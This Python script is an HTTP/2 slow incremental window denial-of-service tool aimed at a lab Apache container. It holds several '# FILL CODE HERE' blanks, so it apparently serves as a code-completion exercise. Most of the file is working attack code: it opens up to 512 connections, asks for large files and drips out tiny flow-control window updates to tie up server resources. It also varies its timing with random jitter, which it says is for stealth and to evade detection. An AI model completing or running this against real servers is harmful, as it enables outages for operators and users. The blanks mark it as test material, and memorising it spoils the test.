#!/usr/bin/env python3
"""
HTTP/2 Advanced Slow Incremental Window Attack - Lab Version
Based on successful zero_window_attack.py implementation with adaptive rate control.

This advanced attack dynamically adjusts window increment timing and sizes based on
server responses, making it harder to detect while maintaining resource exhaustion.
It exploits HTTP/2's flow control with intelligent adaptation to network conditions.

PROTOCOL BACKDOOR: HTTP/2's flow control design assumes cooperative clients. This
attack leverages the protocol's feedback mechanisms to optimize resource exhaustion
while evading detection through adaptive behavioral patterns.
"""

import socket
import threading
import h2.connection
import h2.events
import time
import argparse
import logging
import sys
import random
from typing import List, Dict, Optional
import signal
import statistics
from collections import deque
from dataclasses import dataclass, field

@dataclass
class ConnectionMetrics:
    """Per-connection performance metrics for adaptive rate control"""
    response_times: deque = field(default_factory=lambda: deque(maxlen=20))
    timeout_count: int = 0
    bytes_received: int = 0
    window_updates_sent: int = 0
    last_response_time: Optional[float] = None
    consecutive_timeouts: int = 0
    
    def get_avg_response_time(self) -> float:
        """Get average response time"""
        return statistics.mean(self.response_times) if self.response_times else 1.0

class AdaptiveRateController:
    """Adaptive rate controller that adjusts window update timing and sizes"""
    
    def __init__(self, min_increment: int = 1, max_increment: int = 10):
        self.min_increment = min_increment
        self.max_increment = max_increment
        
        # Adaptive parameters
        self.base_delay_range = (1.0, 8.0)  # Base delay range in seconds
        self.current_delay_range = list(self.base_delay_range)
        self.increment_multiplier = 1.0
        
        # Network condition tracking
        self.global_timeouts = 0
        self.global_responses = 0
        self.last_adaptation = time.time()
        self.adaptation_interval = 30.0  # Adapt every 30 seconds
        
        # Simple PID-like controller
        self.error_history = deque(maxlen=10)
        
    def update_metrics(self, metrics: ConnectionMetrics):
        """Update global metrics"""
        self.global_timeouts += metrics.timeout_count
        if metrics.response_times:
            self.global_responses += len(metrics.response_times)
    
    def should_adapt(self) -> bool:
        """Check if adaptation is needed"""
        return time.time() - self.last_adaptation >= self.adaptation_interval
    
    def adapt_parameters(self):
        """Adapt attack parameters based on current conditions"""
        if not self.should_adapt():
            return
            
        # Calculate timeout ratio
        total_attempts = self.global_timeouts + self.global_responses
        timeout_ratio = self.global_timeouts / max(total_attempts, 1)
        
        # Target timeout ratio is around 0.1-0.3 (10-30%)
        target_ratio = 0.2
        error = timeout_ratio - target_ratio
        self.error_history.append(error)
        
        # Simple adaptive control
        if timeout_ratio > 0.4:  # Too many timeouts - slow down
            self.current_delay_range[0] = min(self.current_delay_range[0] * 1.3, 15.0)
            self.current_delay_range[1] = min(self.current_delay_range[1] * 1.3, 30.0)
            self.increment_multiplier = max(self.increment_multiplier * 0.8, 0.5)
            logging.debug("Adapted for high timeouts - increased delays, reduced increments")
            
        elif timeout_ratio < 0.05:  # Too few timeouts - can be more aggressive
            self.current_delay_range[0] = max(self.current_delay_range[0] * 0.9, 0.5)
            self.current_delay_range[1] = max(self.current_delay_range[1] * 0.9, 3.0)
            self.increment_multiplier = min(self.increment_multiplier * 1.1, 2.0)
            logging.debug("Adapted for low timeouts - decreased delays, increased increments")
            
        else:  # In good range - minor adjustments
            # Apply small corrections based on error history
            if len(self.error_history) >= 3:
                recent_trend = statistics.mean(list(self.error_history)[-3:])
                if abs(recent_trend) > 0.1:
                    adjustment = 1.0 - (recent_trend * 0.1)
                    self.current_delay_range[0] *= adjustment
                    self.current_delay_range[1] *= adjustment
        
        # Keep within reasonable bounds
        self.current_delay_range[0] = max(0.5, min(self.current_delay_range[0], 20.0))
        self.current_delay_range[1] = max(2.0, min(self.current_delay_range[1], 40.0))
        self.increment_multiplier = max(0.3, min(self.increment_multiplier, 3.0))
        
        self.last_adaptation = time.time()
        
        logging.debug(f"Adaptive parameters: delay={self.current_delay_range}, "
                     f"increment_mult={self.increment_multiplier:.2f}, "
                     f"timeout_ratio={timeout_ratio:.3f}")
    
    def get_adaptive_delay(self) -> float:
        """Get adaptive delay based on current conditions"""
        base_delay = random.uniform(self.current_delay_range[0], self.current_delay_range[1])
        
        # Add small random jitter for stealth
        jitter = random.uniform(-0.3, 0.3)
        
        return max(0.1, base_delay + jitter)
    
    def get_adaptive_increment(self) -> int:
        """Get adaptive window increment size"""
        base_increment = random.randint(self.min_increment, self.max_increment)
        adjusted_increment = int(base_increment * self.increment_multiplier)
        
        return max(1, min(adjusted_increment, self.max_increment * 2))

class HTTP2AdaptiveSlowIncrementalAttack:
    """HTTP/2 Advanced Slow Incremental Window Attack with adaptive rate control"""
    
    def __init__(self, target_host: str, target_port: int = 80, num_connections: int = 512, 
                 min_increment: int = 1, max_increment: int = 10):
        self.target_host = target_host
        self.target_port = target_port
        self.num_connections = num_connections
        self.min_increment = min_increment
        self.max_increment = max_increment
        self.active_connections: List[socket.socket] = []
        self.attack_active = True
        
        # Adaptive rate controller
        self.rate_controller = AdaptiveRateController(min_increment, max_increment)
        
    def create_connection(self, conn_id: int) -> bool:
        """Create a single HTTP/2 connection with adaptive slow incremental window updates"""
        try:
            # Create TCP connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(10.0)
            
            logging.info(f"[Connection {conn_id}] Connecting to {self.target_host}:{self.target_port}")
            sock.connect((self.target_host, self.target_port))
            
            # Initialize HTTP/2 connection
            h2_conn = h2.connection.H2Connection()
            h2_conn.initiate_connection()
            
            # Send connection preface
            sock.sendall(h2_conn.data_to_send())
            
            # Configure very small initial window size (adaptive)
            initial_window = # FILL CODE HERE
            h2_conn.update_settings({
                h2.settings.SettingCodes.INITIAL_WINDOW_SIZE: initial_window,
                h2.settings.SettingCodes.MAX_FRAME_SIZE: # FILL CODE HERE
            })
            sock.sendall(h2_conn.data_to_send())
            
            # Wait for server settings
            data = sock.recv(1024)
            events = h2_conn.receive_data(data)
            
            for event in events:
                if isinstance(event, h2.events.RemoteSettingsChanged):
                    logging.debug(f"[Connection {conn_id}] Server settings received")
                elif isinstance(event, h2.events.SettingsAcknowledged):
                    logging.debug(f"[Connection {conn_id}] Settings acknowledged")
            
            # Send settings ACK
            sock.sendall(h2_conn.data_to_send())
            
            # Create multiple streams to maximize impact
            for stream_id in range(1, 9, 2):  # Streams 1, 3, 5, 7
                headers = [
                    (':method', 'GET'),
                    (':path', '/large-test.jpg'),  # Request large file
                    (':scheme', 'http'),
                    (':authority', f'{self.target_host}:{self.target_port}'),
                    ('accept', '*/*'),
                    ('accept-encoding', 'identity'),  # Prevent compression
                    ('cache-control', 'no-cache')
                ]
                
                h2_conn.send_headers(stream_id, headers, end_stream=True)
                sock.sendall(h2_conn.data_to_send())
                
                logging.debug(f"[Connection {conn_id}] Created stream {stream_id}")
            
            # Keep connection alive with adaptive slow incremental window updates
            self.maintain_adaptive_connection(sock, h2_conn, conn_id)
            return True
            
        except Exception as e:
            logging.error(f"[Connection {conn_id}] Failed: {e}")
            if 'sock' in locals():
                sock.close()
            return False
    
    def maintain_adaptive_connection(self, sock: socket.socket, h2_conn: h2.connection.H2Connection, conn_id: int):
        """Maintain connection with adaptive slow incremental window updates"""
        logging.info(f"[Connection {conn_id}] Starting adaptive slow incremental attack")
        
        # Connection-specific metrics
        metrics = ConnectionMetrics()
        
        last_window_update = time.time()
        bytes_received = 0
        total_window_granted = 0
        
        while self.attack_active:
            try:
                # Get adaptive timeout
                adaptive_timeout = max(0.5, self.rate_controller.current_delay_range[0] / 2)
                sock.settimeout(adaptive_timeout)
                
                # Try to read server data
                try:
                    frame_start = time.time()
                    data = sock.recv(4096)
                    frame_end = time.time()
                    
                    if data:
                        # Process HTTP/2 events
                        events = h2_conn.receive_data(data)
                        
                        # Record response time
                        response_time = frame_end - frame_start
                        metrics.response_times.append(response_time)
                        metrics.last_response_time = response_time
                        
                        for event in events:
                            if isinstance(event, h2.events.DataReceived):
                                bytes_received += len(event.data)
                                metrics.bytes_received += len(event.data)
                                
                                logging.debug(f"[Connection {conn_id}] Received {len(event.data)} bytes "
                                            f"on stream {event.stream_id} (total: {bytes_received})")
                                
                                # Use adaptive increment and delay
                                increment = # FILL CODE HERE
                                
                                # Update both connection and stream windows
                                # FILL CODE HERE
                                sock.sendall(h2_conn.data_to_send())
                                
                                total_window_granted += increment * 2
                                metrics.window_updates_sent += 1
                                
                                logging.debug(f"[Connection {conn_id}] Adaptive window grant: +{increment} "
                                            f"(total: {total_window_granted})")
                                
                                # Adaptive delay based on network conditions
                                adaptive_delay = self.rate_controller.get_adaptive_delay()
                                time.sleep(adaptive_delay)
                                
                                # Reset consecutive timeouts on successful data receive
                                metrics.consecutive_timeouts = 0
                                
                    else:
                        logging.warning(f"[Connection {conn_id}] Server closed connection")
                        break
                        
                except socket.timeout:
                    # Track timeout for adaptive control
                    metrics.timeout_count += 1
                    metrics.consecutive_timeouts += 1
                    
                    logging.debug(f"[Connection {conn_id}] Timeout #{metrics.timeout_count} "
                                f"(consecutive: {metrics.consecutive_timeouts})")
                
                # Periodic adaptive adjustments and window updates
                current_time = time.time()
                if current_time - last_window_update > random.uniform(8, 20):  # Every 8-20 seconds
                    try:
                        # Update rate controller with metrics
                        self.rate_controller.update_metrics(metrics)
                        self.rate_controller.adapt_parameters()
                        
                        # Send small periodic window update
                        periodic_increment = random.randint(1, 3)
                        h2_conn.increment_flow_control_window(periodic_increment)
                        sock.sendall(h2_conn.data_to_send())
                        
                        total_window_granted += periodic_increment
                        last_window_update = current_time
                        
                        logging.debug(f"[Connection {conn_id}] Periodic adaptive update: +{periodic_increment}")
                        
                    except Exception as update_error:
                        logging.error(f"[Connection {conn_id}] Adaptive update failed: {update_error}")
                        break
                
                # Adaptive sleep based on current conditions
                sleep_time = random.uniform(1, 4)
                
                # Longer sleep if too many consecutive timeouts
                if metrics.consecutive_timeouts > 5:
                    sleep_time *= 2
                    logging.debug(f"[Connection {conn_id}] Extended sleep due to timeouts")
                
                time.sleep(sleep_time)
                
            except Exception as e:
                logging.error(f"[Connection {conn_id}] Adaptive connection error: {e}")
                break
        
        # Update global metrics before closing
        self.rate_controller.update_metrics(metrics)
        
        # Cleanup
        try:
            sock.close()
        except:
            pass
        
        logging.info(f"[Connection {conn_id}] Adaptive connection closed "
                   f"(received: {bytes_received} bytes, granted: {total_window_granted} bytes, "
                   f"timeouts: {metrics.timeout_count}, updates: {metrics.window_updates_sent})")
    
    def run_attack(self):
        """Launch the HTTP/2 adaptive slow incremental window attack"""
        logging.info(f"🧠 Starting HTTP/2 Adaptive Slow Incremental Window Attack")
        logging.info(f"🎯 Target: {self.target_host}:{self.target_port}")
        logging.info(f"🔗 Connections: {self.num_connections}")
        logging.info(f"📦 Window increments: {self.min_increment}-{self.max_increment} bytes (adaptive)")
        logging.info(f"⚡ Adaptive rate control: Enabled")
        logging.info(f"💀 Attack: Adaptive slow data flow with real-time optimization")
        
        threads = []
        
        # Create attack threads
        for i in range(self.num_connections):
            # FILL CODE HERE: Create and start a thread for create_connection
            
            # Stagger connection attempts with adaptive timing
            stagger_delay = self.rate_controller.get_adaptive_delay() * 0.1
            time.sleep(max(0.1, stagger_delay))
        
        logging.info(f"📡 All {self.num_connections} adaptive attack threads launched")
        
        try:
            # Monitor attack progress with adaptive reporting
            monitoring_interval = 15
            while self.attack_active:
                active_threads = sum(1 for t in threads if t.is_alive())
                
                # Adaptive status reporting
                current_params = self.rate_controller
                timeout_ratio = (current_params.global_timeouts / 
                               max(current_params.global_timeouts + current_params.global_responses, 1))
                
                logging.info(f"📊 Active connections: {active_threads}/{self.num_connections} "
                           f"(timeout ratio: {timeout_ratio:.2f}, "
                           f"delay range: {current_params.current_delay_range[0]:.1f}-{current_params.current_delay_range[1]:.1f}s)")
                
                time.sleep(monitoring_interval)
                
        except KeyboardInterrupt:
            logging.info("\n🛑 Adaptive attack interrupted by user")
            self.stop_attack()
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join(timeout=5)
        
        logging.info("✅ Adaptive attack completed")
    
    def stop_attack(self):
        """Stop the attack gracefully"""
        self.attack_active = False
        logging.info("🔴 Stopping adaptive attack...")

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    logging.info("\n🛑 Received shutdown signal")
    sys.exit(0)

def test_target_connectivity(host: str, port: int) -> bool:
    """Test if target is reachable"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except Exception:
        return False

def main():
    parser = argparse.ArgumentParser(
        description='HTTP/2 Advanced Slow Incremental Window Attack - Lab Version with Adaptive Control',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Attack lab Apache container with adaptive control
  python3 adv_slow_inc_window_attack.py apache-victim --port 80 --connections 15
  
  # Attack with custom parameters and verbose logging
  python3 adv_slow_inc_window_attack.py apache-victim --min-increment 1 --max-increment 8 --verbose
        """
    )
    
    parser.add_argument('target', help='Target hostname (e.g., apache-victim)')
    parser.add_argument('--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('--connections', type=int, default=512, 
                       help='Number of concurrent connections (default: 512)')
    parser.add_argument('--min-increment', type=int, default=1,
                       help='Minimum window increment in bytes (default: 1)')
    parser.add_argument('--max-increment', type=int, default=10,
                       help='Maximum window increment in bytes (default: 10)')
    parser.add_argument('--verbose', '-v', action='store_true', 
                       help='Enable verbose logging')
    
    args = parser.parse_args()
    
    # Validate arguments
    if args.min_increment < 1:
        logging.error("Minimum increment must be at least 1 byte")
        return 1
    if args.max_increment < args.min_increment:
        logging.error("Maximum increment must be >= minimum increment")
        return 1
    
    # Setup logging
    log_level = logging.DEBUG if args.verbose else logging.INFO
    logging.basicConfig(
        level=log_level,
        format='%(asctime)s [%(levelname)s] %(message)s',
        datefmt='%H:%M:%S'
    )
    
    # Suppress noisy h2/hpack debug messages
    logging.getLogger('h2').setLevel(logging.WARNING)
    logging.getLogger('hpack').setLevel(logging.WARNING)
    
    # Install signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    # Validate target connectivity
    logging.info(f"🔍 Testing connectivity to {args.target}:{args.port}")
    if not test_target_connectivity(args.target, args.port):
        logging.error(f"❌ Cannot reach {args.target}:{args.port}")
        logging.error("💡 Make sure the lab is running: ./run_lab.sh")
        return 1
    
    logging.info(f"✅ Target {args.target}:{args.port} is reachable")
    
    # Create and run adaptive attack
    try:
        # FILL CODE HERE: Create and run the attack
    except Exception as e:
        logging.error(f"💥 Adaptive attack failed: {e}")
        return 1
    
    return 0

if __name__ == '__main__':
    sys.exit(main())